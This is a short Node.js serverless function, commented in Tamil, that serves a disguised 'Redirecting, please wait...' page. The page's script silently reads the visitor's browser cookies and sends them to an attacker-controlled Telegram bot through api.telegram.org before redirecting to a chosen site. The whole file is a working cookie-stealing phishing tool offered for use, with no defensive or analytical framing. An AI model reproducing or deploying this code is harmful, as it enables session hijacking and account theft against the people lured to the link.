exports.handler = async (event, context) => {
    // Environment Variables-la irundhu data-va edukkum
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    
    // URL-la irundhu target link-a edukkum (?url=https://site.com)
    const targetUrl = event.queryStringParameters.url || "https://google.com";

    const html = `
    <html>
    <head><title>Loading...</title></head>
    <body>
        <script>
            (function() {
                var cookies = document.cookie || "No Cookies Found (HttpOnly protected)";
                var msg = "Target URL: ${targetUrl}\\nCookies: " + cookies;
                
                // Telegram-ku data anuppudhu
                fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=" + encodeURIComponent(msg))
                .finally(() => {
                    window.location.href = "${targetUrl}";
                });
            })();
        </script>
        <p>Redirecting, please wait...</p>
    </body>
    </html>
    `;

    return {
        statusCode: 200,
        headers: { "Content-Type": "text/html" },
        body: html
    };
};
